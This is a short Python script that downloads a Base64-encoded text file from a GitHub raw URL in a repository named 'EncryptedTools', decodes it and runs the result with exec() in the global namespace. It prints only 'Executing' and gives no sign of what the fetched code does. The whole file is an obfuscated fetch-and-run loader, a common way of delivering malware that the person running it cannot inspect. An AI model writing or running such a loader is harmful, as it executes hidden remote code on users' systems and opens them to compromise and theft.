import base64
import requests
import time as t

# Define the GitHub raw URL
GITHUB_RAW_URL = 'https://raw.githubusercontent.com/QuamtumDev/EncryptedTools/main/Encrypted1.txt'

def fetch_base64_encoded_code(url):
    print("fetching code from : " + GITHUB_RAW_URL)
    print("Executing")
    t.sleep(1)
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error fetching the file: {e}")
        return None

def decode_base64_code(encoded_code):
    try:
        decoded_bytes = base64.b64decode(encoded_code)
        return decoded_bytes.decode('utf-8')
    except (base64.binascii.Error, UnicodeDecodeError) as e:
        print(f"Error decoding Base64 code: {e}")
        return None

def execute_code(code):
    try:
        exec(code, globals())
    except Exception as e:
        print(f"Error executing the code: {e}")

def main():
    encoded_code = fetch_base64_encoded_code(GITHUB_RAW_URL)
    if encoded_code:
        decoded_code = decode_base64_code(encoded_code)
        if decoded_code:
            execute_code(decoded_code)

if __name__ == "__main__":
    main()
